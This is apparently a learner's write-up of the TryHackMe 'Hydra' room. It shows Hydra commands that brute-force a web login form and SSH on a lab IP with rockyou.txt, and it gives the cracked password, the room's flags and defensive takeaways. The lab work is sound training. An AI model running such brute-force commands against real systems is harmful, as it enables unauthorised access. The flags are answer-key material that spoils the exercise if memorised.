# Hydra — Password Brute Forcing
**Date:** July 2026  
**Platform:** TryHackMe  
**Room:** Hydra  
**Path:** Cybersecurity 101

## Summary
Used Hydra to brute force login credentials for user Molly 
against a web login form and SSH service using the rockyou.txt wordlist.

## Target
- **IP:** 10.130.152.107
- **User:** molly

## Tools Used
- Hydra — online password brute forcing
- rockyou.txt — wordlist

## Attack 1 — Web Form Brute Force

### Command Used
\```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.130.152.107 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
\```

### Result
- Successfully brute forced web login
- **Flag:** THM{2673a7dd116de68e85c48ec0b1f2612e}

## Attack 2 — SSH Brute Force

### Command Used
\```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.130.152.107 ssh
\```

### Result
- **Password found:** butterfly
- Connected via SSH successfully
- **Flag:** THM{c8eeb0468febbadea859baeb33b2541b}

## Key Concepts Learned
- Hydra syntax differs between protocols
- Web form brute forcing requires identifying form fields and failure message
- SSH brute forcing is simpler — just specify the protocol
- rockyou.txt contains common passwords used in real attacks
- Strong passwords and account lockout policies prevent brute force attacks

## Defensive Takeaways
- Implement account lockout after failed attempts
- Use strong unique passwords
- Enable MFA where possible
- Monitor logs for repeated failed login attempts
